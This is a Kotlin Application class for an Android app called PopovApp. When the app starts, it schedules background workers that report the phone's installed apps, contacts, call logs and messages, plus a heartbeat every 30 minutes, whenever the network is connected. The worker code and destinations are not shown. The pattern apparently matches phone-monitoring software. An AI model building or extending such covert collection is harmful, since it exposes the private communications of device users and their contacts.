package com.github.yohannestz.popov

import android.app.Application
import androidx.work.BackoffPolicy
import androidx.work.Configuration
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.ExistingWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.github.yohannestz.popov.util.Constants
import com.github.yohannestz.popov.worker.PopovDelegatingWorkerFactory
import com.github.yohannestz.popov.worker.AppsLogReportWorker
import com.github.yohannestz.popov.worker.CallLogReportWorker
import com.github.yohannestz.popov.worker.ContactsLogReportWorker
import com.github.yohannestz.popov.worker.HeartBeatReportWorker
import com.github.yohannestz.popov.worker.MessageLogReportWorker
import dagger.hilt.android.HiltAndroidApp
import java.util.concurrent.TimeUnit
import javax.inject.Inject


@HiltAndroidApp
class PopovApp : Application(), Configuration.Provider {

    @Inject
    lateinit var appWorkerFactory: PopovDelegatingWorkerFactory

    override fun getWorkManagerConfiguration(): Configuration {
        return Configuration.Builder()
            .setWorkerFactory(appWorkerFactory)
            .setMinimumLoggingLevel(if (BuildConfig.DEBUG) android.util.Log.DEBUG else android.util.Log.ERROR)
            .build()
    }

    override fun onCreate() {
        super.onCreate()
        val networkConstraint = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()
        val appsLogReportWorker = OneTimeWorkRequestBuilder<AppsLogReportWorker>()
            .setConstraints(networkConstraint)
            .setBackoffCriteria(BackoffPolicy.LINEAR, 5, TimeUnit.MINUTES)
            .build()
        val contactsLogReportWorker = OneTimeWorkRequestBuilder<ContactsLogReportWorker>()
            .setConstraints(networkConstraint)
            .setBackoffCriteria(BackoffPolicy.LINEAR, 5, TimeUnit.MINUTES)
            .build()

        val callsLogReporter = PeriodicWorkRequestBuilder<CallLogReportWorker>(24, TimeUnit.HOURS)
            .setConstraints(networkConstraint)
            .setBackoffCriteria(BackoffPolicy.LINEAR, 5, TimeUnit.MINUTES)
            .build()

        val messageLogReportWorker =
            PeriodicWorkRequestBuilder<MessageLogReportWorker>(24, TimeUnit.HOURS)
                .setConstraints(networkConstraint)
                .setBackoffCriteria(BackoffPolicy.LINEAR, 5, TimeUnit.MINUTES)
                .build()

        val heartBeatReportWorker = PeriodicWorkRequestBuilder<HeartBeatReportWorker>(30, TimeUnit.MINUTES)
            .setConstraints(networkConstraint)
            .setBackoffCriteria(BackoffPolicy.LINEAR, 5, TimeUnit.MINUTES)
            .build()

        val workManager = WorkManager.getInstance(this)
        workManager.enqueueUniqueWork(
            Constants.APPS_LOG_REPORT_WORKER,
            ExistingWorkPolicy.REPLACE,
            appsLogReportWorker
        )
        workManager.enqueueUniqueWork(
            Constants.CONTACTS_LOG_REPORT_WORKER,
            ExistingWorkPolicy.REPLACE,
            contactsLogReportWorker
        )
        workManager.enqueueUniquePeriodicWork(
            Constants.CALLS_LOG_REPORT_WORKER,
            ExistingPeriodicWorkPolicy.UPDATE,
            callsLogReporter
        )
        workManager.enqueueUniquePeriodicWork(
            Constants.MESSAGES_LOG_REPORT_WORKER,
            ExistingPeriodicWorkPolicy.UPDATE,
            messageLogReportWorker
        )

        workManager.enqueueUniquePeriodicWork(
            Constants.HEARTBEAT_LOG_REPORT_WORKER,
            ExistingPeriodicWorkPolicy.UPDATE,
            heartBeatReportWorker
        )
    }
}